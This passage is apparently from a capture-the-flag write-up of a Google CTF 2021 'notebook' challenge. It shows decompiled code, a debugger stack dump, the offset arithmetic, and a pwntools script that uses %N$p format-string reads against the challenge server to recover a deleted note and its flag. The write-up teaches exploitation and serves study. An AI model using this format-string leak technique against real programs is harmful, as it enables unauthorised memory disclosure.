  printf("> ");
  return;
}
undefined8 main(void)
{
  long lVar1;
  long in_FS_OFFSET;
  int user_choice;
  int i;
  note_t notes [10];
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  for (i = 0; i  3
Quote: %x
 ____
 ----
   \    /\_/\
    \  ( o.o )
        > ^  notes.txt
┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ ./notebook
This is your confidential notebook.
This should get you through the next mission!
Good luck!
Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
> 1
Here's a list of our notes:
 - 00. length: 010, state: LIVE
 - 01. length: 011, state: LIVE
 - 02. length: 010, state: LIVE
 - 03. length: 014, state: DELETED
 - 04. length: 010, state: LIVE
 - 05. length: 000, state: DELETED
 - 06. length: 000, state: DELETED
 - 07. length: 000, state: DELETED
 - 08. length: 000, state: DELETED
 - 09. length: 000, state: DELETED
Please choose what you want to do:
1. List built-in note metadata.
2. Print out a built-in note.
3. Make a draft your note.
4. Add note to notebook.
5. Delete note.
9. Quit.
> 2
Which note would you like to print out? 3
 _________
 ---------
   \    /\_/\
    \  ( o.o )
        > ^  9
 ___________
 -----------
   \    /\_/\
    \  ( o.o )
        > ^   stack 200
0x00007fffffffce60│+0x0000: 0x00000017f7fb1540   ← $rsp
0x00007fffffffce68│+0x0008: 0x0000555555557008  →  0x5c2000203c003e20 (">"?)
0x00007fffffffce70│+0x0010: 0x00007fffffffcf10  →  "%p.%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffce78│+0x0018: 0x000055555555700b  →  0x202f005c2000203c ("\n"      ← $rdi
0x00007fffffffce98│+0x0038: "%p.%p.%p.%p.%p.%p >\n"
0x00007fffffffcea0│+0x0040: ".%p.%p.%p >\n"
0x00007fffffffcea8│+0x0048: 0x000000000a3e2070 ("p >\n"?)
0x00007fffffffceb0│+0x0050: 0x0000000000000000
0x00007fffffffceb8│+0x0058: 0x0000000000000000
0x00007fffffffcec0│+0x0060: 0x00007fffffff0000  →  0x0000000000000000
0x00007fffffffcec8│+0x0068: 0xc545c1ab5ecb2800
0x00007fffffffced0│+0x0070: 0x00007fffffffd120  →  0x00007fffffffd360  →  0x00007fffffffe7c0  →  0x00005555555560e0  →   endbr64      ← $rbp
0x00007fffffffced8│+0x0078: 0x0000555555555800  →   jmp 0x5555555558b8 
0x00007fffffffcee0│+0x0080: 0x00007fffffffd130  →  0x0000007331313525 ("%511s"?)
0x00007fffffffcee8│+0x0088: 0x00007fffffffd150  →  "%p.%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffcef0│+0x0090: 0x00007fffffffd130  →  0x0000007331313525 ("%511s"?)
0x00007fffffffcef8│+0x0098: 0x0000001700000001
...
0x00007fffffffd350│+0x04f0: 0x0000000000000000
0x00007fffffffd358│+0x04f8: 0xc545c1ab5ecb2800
0x00007fffffffd360│+0x0500: 0x00007fffffffe7c0  →  0x00005555555560e0  →   endbr64
0x00007fffffffd368│+0x0508: 0x000055555555606c  →   jmp 0x5555555560a2 
0x00007fffffffd370│+0x0510: 0x00007fffffffe8b8  →  0x00007fffffffeb44  →  "/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehou[...]"
0x00007fffffffd378│+0x0518: 0x0000000100000000
0x00007fffffffd380│+0x0520: 0x0000000000000000
0x00007fffffffd388│+0x0528: 0x0000000a00000003
0x00007fffffffd390│+0x0530: "First note"
0x00007fffffffd398│+0x0538: 0x0000000000006574 ("te"?)
...
```
Now, stepping over the `printf`, we get the following output from the program:
```
gef>  ni
```
Now we match the output from `printf` to the stack: We can see that `0x17f7fb1540` is the first value from `printf` that appears in the stack dump, meaning that we need to adjust our `printf` offset to account for the 5 values printed before it. We also see that `First note` appears at `0x00007fffffffd390│`, so: `(0x00007fffffffd390 - 0x00007fffffffce60) / 8 == 166`. Altogether we get 172 QWORDs until the first note, let's double check that:
```
> 3
Quote: %172$p
 ________
 --------
   \    /\_/\
    \  ( o.o )
        > ^  ')
def make_draft(io, draft):
    read_menu(io)
    io.sendline(b'3')
    io.recvuntil(b'Quote: ')
    io.sendline(draft.encode())
    io.recvuntil(b'', drop = True)
    log.info(f"Creating draft: Sent: {draft}, got: {res}")
    return res
io = start()
BASE_OFFSET = 365
note = ""
offset = 0
while "}" not in note:
    res = format(int(make_draft(io, f"%{BASE_OFFSET + offset}$p"), 16), 'x')
    decoded = unhex(res.rstrip('0')).decode()[::-1]
    offset += 1
    note += decoded
log.success(f"Deleted note recovered: '{note}'")
```
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/google/11_Heathrow_-_Secret_Warehouse/notebook'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-notebook.2021.ctfcompetition.com on port 1337: Done
[*] Creating draft: Sent: %365$p, got: 0x696d655200000000
[*] Creating draft: Sent: %366$p, got: 0x5443203a7265646e
[*] Creating draft: Sent: %367$p, got: 0x74616d726f667b46
[*] Creating draft: Sent: %368$p, got: 0x5f676e697274735f
[*] Creating draft: Sent: %369$p, got: 0x5f6568745f726f66
[*] Creating draft: Sent: %370$p, got: 0x7d6e6977
[+] Deleted note recovered: 'Reminder: CTF{format_string_for_the_win}'
[*] Closed connection to pwn-notebook.2021.ctfcompetition.com port 1337
```